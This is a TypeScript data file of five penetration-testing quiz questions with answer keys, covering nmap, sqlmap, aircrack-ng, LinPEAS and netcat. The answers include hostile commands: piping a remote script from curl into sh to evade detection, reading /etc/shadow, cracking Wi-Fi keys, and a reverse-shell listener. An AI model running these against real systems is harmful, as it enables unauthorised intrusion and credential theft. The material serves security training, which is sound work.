import type { QuizQuestion } from '../types';

export const QUIZ_QUESTIONS: QuizQuestion[] = [
  {
    id: 'q1',
    scenario: 'You are conducting an external penetration test. The client’s firewall blocks standard ICMP ping probes, causing your initial port scans to report hosts as down. You need to scan the top 1000 ports stealthily without pinging.',
    question: 'Which Nmap command should you execute?',
    options: [
      'nmap -sT -p 1-65535 target.com',
      'nmap -sS -Pn -n --top-ports 1000 -T4 target.com',
      'nmap -sU -p 1000 target.com',
      'nmap -A -v target.com'
    ],
    answer: 1,
    explanation: 'The `-Pn` flag tells Nmap to skip ICMP host discovery and treat all hosts as online. `-sS` runs a stealth half-open SYN scan, and `-n` disables DNS lookups for speed and stealth.',
    toolRef: 'nmap'
  },
  {
    id: 'q2',
    scenario: 'During a web application security audit, you discover an injectable parameter `id=5` on a production PHP site. You want to extract all database names automatically without manually crafting SQL payloads.',
    question: 'Which tool and syntax is best suited for this task?',
    options: [
      'nikto -h "https://target.com/vuln.php?id=5"',
      'gobuster dir -u "https://target.com/vuln.php?id=5"',
      'sqlmap -u "https://target.com/vuln.php?id=5" --batch --dbs --random-agent',
      'commix --url="https://target.com/vuln.php?id=5"'
    ],
    answer: 2,
    explanation: 'sqlmap is the premier tool for automated detection and exploitation of SQL injection vulnerabilities. The `--dbs` flag enumerates database names, and `--batch` runs non-interactively.',
    toolRef: 'sqlmap'
  },
  {
    id: 'q3',
    scenario: 'You have captured an 802.11 WPA2 4-way authentication handshake in a file named `capture-01.cap`. You need to crack the pre-shared key (PSK) offline using the `rockyou.txt` dictionary.',
    question: 'Which command recovers the Wi-Fi key from the capture file?',
    options: [
      'airmon-ng start capture-01.cap',
      'aireplay-ng --deauth 10 capture-01.cap',
      'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap',
      'airodump-ng -w rockyou.txt capture-01.cap'
    ],
    answer: 2,
    explanation: '`aircrack-ng` is designed to perform dictionary attacks on captured WPA/WPA2 4-way handshakes offline without touching the target wireless network.',
    toolRef: 'aircrack-ng'
  },
  {
    id: 'q4',
    scenario: 'You obtained a low-privilege shell as `www-data` on an Ubuntu target machine. You need to quickly identify misconfigurations, SUID binaries, cron jobs, and potential root privilege escalation vectors without writing scripts to disk.',
    question: 'Which command executes an automated Linux privilege escalation engine directly in memory?',
    options: [
      'curl -L https://.../linpeas.sh | sh',
      'find / -perm -u=s -type f',
      'cat /etc/shadow',
      'john --wordlist=rockyou.txt /etc/passwd'
    ],
    answer: 0,
    explanation: 'Piping `curl -L <linpeas-url> | sh` streams the LinPEAS privilege escalation script directly into the shell process without writing it to disk, avoiding file detection while checking hundreds of vectors.',
    toolRef: 'linpeas'
  },
  {
    id: 'q5',
    scenario: 'You need to set up a fast local TCP listener on port 4444 to catch an incoming reverse shell from an exploited target.',
    question: 'Which command opens a verbose, non-DNS resolving TCP listener?',
    options: [
      'socat TCP-LISTEN:4444',
      'nc -lvnp 4444',
      'tcpdump -i eth0 port 4444',
      'tshark -i 4444'
    ],
    answer: 1,
    explanation: '`nc -lvnp 4444` sets Netcat into Listen mode (`-l`), Verbose (`-v`), Numeric only without DNS (`-n`), on Port 4444 (`-p`).',
    toolRef: 'netcat'
  }
];
